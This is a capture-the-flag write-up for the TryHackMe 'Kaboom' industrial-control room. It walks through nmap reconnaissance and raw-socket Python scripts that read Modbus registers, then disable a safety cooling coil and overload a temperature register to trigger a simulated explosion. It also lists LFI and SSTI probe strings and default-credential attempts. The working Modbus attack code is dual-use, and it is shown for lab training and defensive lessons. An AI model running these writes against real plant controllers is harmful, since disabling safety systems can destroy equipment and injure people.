# TryHackMe — Kaboom

> **ICS/OT APT Simulation | Modbus TCP Exploitation | TRITON-Pattern Attack**

| Field | Value |
|---|---|
| Room | [Kaboom](https://tryhackme.com/room/kaboom) |
| Difficulty | Medium |
| Category | ICS / OT / Industrial Security |
| Flag | `THM{BOOM_BOO***ABOOM}` |

---

## Scenario

You are an APT operator. Using a single crafted Modbus command, you create overpressure in the main pump, causing a deafening rupture that floods the plant with alarms. While chaos reigns, your partner infiltrates the DMZ and plants a covert implant.

---

## Reconnaissance

### Nmap Full Port Scan

```bash
nmap -sCV -p- TARGET_IP
```

Seven open ports reveal a full ICS stack — both IT and OT layers coexisting without segmentation:

| Port | Service | Role |
|---|---|---|
| 22/tcp | OpenSSH 9.6p1 (Ubuntu) | SSH — potential persistence target |
| 80/tcp | Werkzeug/3.1.3 Python/3.12.3 | Flask — "PLC CCTV Simulator" |
| 102/tcp | Siemens S7 (ISO-TSAP) | SNAP7-SERVER, CPU 315-2 PN/DP emulator |
| 502/tcp | Modbus TCP (MBAP) | **Primary attack surface** — standard Modbus port |
| 1880/tcp | Node-RED | IoT/automation flow engine (authenticated) |
| 8080/tcp | Werkzeug/2.3.7 Python/3.12.3 | OpenPLC Webserver (authenticated) |
| 44818/tcp | EtherNet/IP (CIP) | Industrial protocol — CVE-2024-34026 potential |

Key observations from the Nmap fingerprint:

- **S7-info** reveals `System Name: SNAP7-SERVER`, `Module: 6ES7 315-2EH14-0AB0` — an open-source S7 communication library emulating a Siemens S7-300 PLC. Not a real PLC, but speaks real S7comm protocol.
- **Port 80** serves static HTML — a CCTV-style monitoring page that polls `/api/state` every 5 seconds and renders video based on PLC state.
- **Port 8080** redirects to `/login` with Flask session cookies — identified as **OpenPLC Webserver** (Release: 2025-03-31) via HTML source and logo.
- **Port 1880** returns `Unauthorized` on `/flows` and `/settings` — Node-RED with authentication enabled.

### Architecture Understanding

The system follows a simplified ICS architecture with no Purdue Model segmentation:

```
Attacker (us)
    │
    ├── TCP:80  ──► Flask CCTV Simulator (monitoring — reads PLC state)
    ├── TCP:502 ──► Modbus TCP (direct PLC memory access — no auth)
    ├── TCP:102 ──► S7comm (direct PLC memory access — no auth)
    ├── TCP:1880 ─► Node-RED (authenticated — integration layer)
    ├── TCP:8080 ─► OpenPLC Webserver (authenticated — engineering station)
    └── TCP:44818 ► EtherNet/IP (direct PLC memory access — no auth)
```

All industrial protocols (Modbus, S7, EtherNet/IP) are **authentication-free by design** (CWE-306). Network access equals process control.

---

## Enumeration

### CCTV Simulator Analysis (Port 80)

```bash
curl -s http://TARGET:80/api/state | python3 -m json.tool
```

```json
{
    "status": "Cooling OFF, Low Temperature",
    "video": "normal"
}
```

The `/api/state` endpoint reflects real-time PLC state. The JavaScript frontend uses the `video` field to select a video file via `/video?mode=${video}`. Tested for LFI (`../../../etc/passwd`) and SSTI (`{{7*7}}`) — both negative; the endpoint falls back to `default.mp4` for any unknown mode value.

### OpenPLC Login (Port 8080)

Default credentials `openplc:openplc` — **failed**. Brute-force deferred; pivoted to direct Modbus enumeration.

### Modbus Register Enumeration (Port 502)

Read Holding Registers using raw Python sockets (no pymodbus dependency):

```python
import socket, struct

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('TARGET_IP', 502))

# Modbus TCP: TID=1, Proto=0, Len=6, UnitID=1, FC=0x03, StartAddr=0, NumRegs=50
pkt = struct.pack('>HHHBBHH', 1, 0, 6, 1, 3, 0, 50)
s.send(pkt)
resp = s.recv(1024)

if len(resp) > 9:
    byte_count = resp[8]
    for i in range(0, byte_count, 2):
        val = struct.unpack('>H', resp[9+i:11+i])[0]
        if val != 0:
            print(f'HR[{i//2}] = {val}')
s.close()
```

**Result:** `HR[0] = 56` — the only non-zero register. Correlates with CCTV status "Low Temperature".

### Full Modbus Memory Map

Scanned all four Modbus object types:

| Object Type | Function Code | Finding |
|---|---|---|
| **Holding Registers** (FC 0x03) | Read/Write | HR[0] = 56 (temperature value) |
| **Coils** (FC 0x01) | Read/Write | Coil[15] = 0 (cooling relay — OFF at low temp) |
| **Discrete Inputs** (FC 0x02) | Read-only | Empty |
| **Input Registers** (FC 0x04) | Read-only | Empty |

---

## Exploitation

### Phase 1 — Initial Write Test

Wrote a high value to HR[0] using FC 0x06 (Write Single Register):

```python
# FC 0x06: Write Single Register — addr=0, value=999
pkt = struct.pack('>HHHBBHH', 1, 0, 6, 1, 6, 0, 999)
```

**Response:** `0001000000060106000003e7` — echo confirms successful write.

**CCTV state changed:**

```json
{
    "status": "High Temperature, Cooling ON",
    "video": "cooling"
}
```

However, re-reading HR[0] after a few seconds showed the value **decreasing** (999 → 904 → ...). The PLC ladder logic was actively compensating: detecting high temperature → enabling Coil[15] (cooling) → decrementing HR[0]. The safety system was fighting back.

### Phase 2 — TRITON-Pattern: Disable Safety + Overload

The key insight: **a single-vector attack is insufficient** when PLC logic includes active safety compensation. The attack requires two simultaneous actions:

1. **Disable the safety system** — Write Coil[15] = OFF (FC 0x05)
2. **Overload the process parameter** — Write HR[0] = 65535 (FC 0x06)

This mirrors the real-world **TRITON/TRISIS attack** (2017, Saudi petrochemical plant), where attackers reprogrammed the Safety Instrumented System (SIS) before driving the process to a dangerous state.

```python
import socket, struct, time

def modbus_write_coil(addr, value):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('TARGET_IP', 502))
    # FC 0x05: Write Single Coil — 0x0000=OFF, 0xFF00=ON
    pkt = struct.pack('>HHHBBHH', 1, 0, 6, 1, 5, addr, value)
    s.send(pkt)
    resp = s.recv(1024)
    print(f'Coil write: {resp.hex()}')
    s.close()

def modbus_write_reg(addr, value):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('TARGET_IP', 502))
    pkt = struct.pack('>HHHBBHH', 1, 0, 6, 1, 6, addr, value)
    s.send(pkt)
    s.close()

# Step 1: Disable cooling safety relay
modbus_write_coil(15, 0x0000)
time.sleep(0.5)

# Step 2: Set temperature to maximum (uint16 max)
modbus_write_reg(0, 65535)
```

### Result — Explosion

```bash
curl -s http://TARGET:80/api/state | python3 -m json.tool
```

```json
{
    "status": "Explosion Detected!",
    "video": "explodedflag23"
}
```

The CCTV simulator switched to the explosion video, which contained the flag rendered in red text over the explosion animation.

### Flag

```
THM{BOOM_BOO***ABOOM}
```

---

## Vulnerability Summary

| Field | Detail |
|---|---|
| **Title** | Unauthenticated Modbus TCP Write Enables Safety Override and Process Destruction |
| **Severity** | Critical (CVSS 3.1: 9.1 — AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H) |
| **CWE** | CWE-306: Missing Authentication for Critical Function |
| **ATT&CK ICS** | T0855 (Unauthorized Command Message), T0836 (Modify Parameter), T0816 (Device Restart/Stop), T0831 (Manipulation of Control) |
| **Impact** | Physical destruction of industrial equipment; loss of safety controls; potential harm to personnel |

### Additional Vulnerabilities Identified (Not Exploited)

| CVE | Component | CVSS | Description |
|---|---|---|---|
| CVE-2024-34026 | EtherNet/IP parser (port 44818) | 9.8 | Stack buffer overflow → unauthenticated RCE |
| CVE-2021-31630 | OpenPLC Webserver (port 8080) | 8.8 | Authenticated RCE via Hardware Layer code injection |
| CVE-2026-14480 | OpenPLC Webserver (port 8080) | — | Authenticated arbitrary file write via `os.path.join` |

---

## Lessons Learned

1. **Safety system bypass is a prerequisite for process disruption.** Writing extreme values alone is insufficient when PLC ladder logic includes active compensation (cooling decrements temperature). Disabling the safety output (Coil) simultaneously with parameter overload — the TRITON pattern — is required to achieve destructive impact.

2. **Modbus TCP is unauthenticated by design (1979 protocol).** FC 0x03 reads and FC 0x05/0x06 writes require zero credentials. Network access to port 502 equals full process control. This is CWE-306, not a misconfiguration — it is a protocol-level architectural weakness.

3. **Raw Python sockets beat library dependencies on CTF boxes.** `pymodbus` was unavailable on the attack box; `socket` + `struct` (stdlib) achieved identical results with full byte-level visibility. The MBAP header structure (`TID:2 + Proto:2 + Len:2 + UnitID:1`) + PDU (`FC:1 + payload`) is simple enough to construct manually.

4. **CCTV/HMI systems are confirmation channels.** The Flask CCTV simulator on port 80 provided real-time feedback on PLC state changes via `/api/state`, enabling the attacker to verify the impact of each Modbus write without direct PLC console access.

5. **Purdue Model isolation absence is the root cause.** All seven services (IT + OT) were reachable from the attacker network on the same subnet. In a properly segmented environment (ISA/IEC 62443), port 502 would be unreachable from the enterprise/DMZ zone. DORA/TIBER-EU engagements exist precisely to test whether this segmentation holds in practice.

---

## MITRE ATT&CK ICS Kill Chain

| Phase | Technique | Action |
|---|---|---|
| Discovery | T0846 — Remote System Discovery | Nmap fingerprinting of S7, Modbus, EtherNet/IP |
| Collection | T0861 — Point & Tag Identification | FC 0x03 register enumeration → HR[0]=temperature, Coil[15]=cooling |
| Inhibit Response | T0816 — Device Restart/Stop | FC 0x05 → Coil[15]=OFF (safety disabled) |
| Impair Process | T0836 — Modify Parameter | FC 0x06 → HR[0]=65535 (temperature overload) |
| Impair Process | T0855 — Unauthorized Command Message | All Modbus writes — zero authentication |
| Impact | T0831 — Manipulation of Control | "Explosion Detected!" — physical destruction |

---

## Tools Used

- `nmap` — ICS service fingerprinting (s7-info script)
- `curl` — HTTP API enumeration and state verification
- `feroxbuster` — web directory brute-force
- `python3` (stdlib: `socket`, `struct`) — raw Modbus TCP client for register read/write/coil operations

---

*Writeup by [nos](https://tryhackme.com/p/nos010101)*
